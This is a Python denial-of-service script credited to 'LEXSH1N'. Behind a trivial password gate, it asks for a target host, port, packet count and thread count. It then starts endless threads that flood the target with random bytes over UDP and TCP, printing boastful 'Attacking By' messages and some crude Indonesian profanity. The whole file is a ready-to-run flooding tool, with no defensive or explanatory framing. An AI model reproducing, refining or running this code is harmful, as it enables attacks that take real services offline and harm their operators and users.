password ='gg'
import random
import socket
import threading
import os,sys
import time
os.system("clear")
for i in range(3):
    pwd = input("[•] Enter Account : ")
    j=3
    if(pwd==password):
        time.sleep(3)
        print("[+] Wait A Moment!!! ")
        break
    else:
        time.sleep(3)
        print("[×] Wrong Account!!! ")
        continue
time.sleep(3)
print("[@] Login Successful")
time.sleep(3)
os.system("clear")
print("Credit By LEXSH1N:SAMP")
ip = str(input("[ENTER] Host/Url:"))
port = int(input("[ENTER] Port:"))
choice = str(input("[ENTER] Enter Y to Start(y/n):"))
times = int(input("[ENTER]Packets:"))
threads = int(input("[ENTER] Threads:"))
os.system("clear")
def run():
    data = random._urandom(1800)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"Attacking By [LEXSH1N] Sent To Ip : %sAnd Try sent To Port : %s"%(ip, port))
        except:
            print("TOK AND TOK DOWN OAKWKAKWKAM")
def run2():
    data = random._urandom(1024)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacking By [LEXSH1N] Sent To Ip : %sAnd Try sent To Port : %s"%(ip, port))
        except:
            s.close()
            print("TOK AND TOK DOWN OAKWKAKWKAM")
def run3():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacking By [LEXSH1N] Sent To Ip : %sAnd Try sent To Port : %s"%(ip, port))
        except:
            s.close()
            print("TOK AND TOK DOWN OAKWKAKWKAM")

def run4():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacking By [LEXSH1N] Sent To Ip : %sAnd Try sent To Port : %s"%(ip, port))
        except:
            s.close()
            print("TOK  AND TOK KONTOL AOWKOAKW DOWN")
for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target = run)
        th.start()
        th = threading.Thread(target = run2)
        th.start()
        th = threading.Thread(target = run3)
        th.start()
    else:
        th = threading.Thread(target = run4)
        th.start()